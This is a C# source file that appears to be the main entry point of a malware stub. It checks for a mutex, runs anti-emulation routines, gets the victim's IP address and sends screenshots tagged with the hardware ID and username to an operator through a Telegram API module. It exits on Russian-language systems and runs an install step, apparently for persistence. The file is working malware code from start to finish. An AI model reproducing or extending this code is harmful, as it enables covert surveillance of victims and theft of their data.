using Stub.Help;
using Stub.Help.Native;
using Stub.Protection;
using Stub.TelegramAPI;
using System;
using System.Windows.Forms;

namespace Stub
{
    internal class Program
    {
        [STAThread]
        public static void Main()
        {
            if (!MutEx.CreateMutEx())
            {
                Environment.Exit(0);
            }

            AntiEmulation.Run();
            if (Config.get_ip)
                StringHelper.GetIP();
            string message = $"{Config.buildVersion} Online {StringHelper.userIP} <code>{HWID.GetHardwareId()}@{Environment.UserName}</code>";
            SendDocument.ScreenShot(message);
            int i = 0;
            while (true)
            {
                if (i == 25)
                {
                    break;
                }
                else
                    i++;
                NativeMethods.Sleep(1000);
            }

            if (NativeMethods.GetUserDefaultUILanguage() == 0x0419)
                Environment.Exit(0);

            if (Config.install)
            {
                Install.Run();
            }

            SendDocument.ScreenShot(message);

            try
            {
                using (var formBUF = new FormBUF())
                {
                    Application.Run();
                }
            }
            catch { }
        }
    }
}
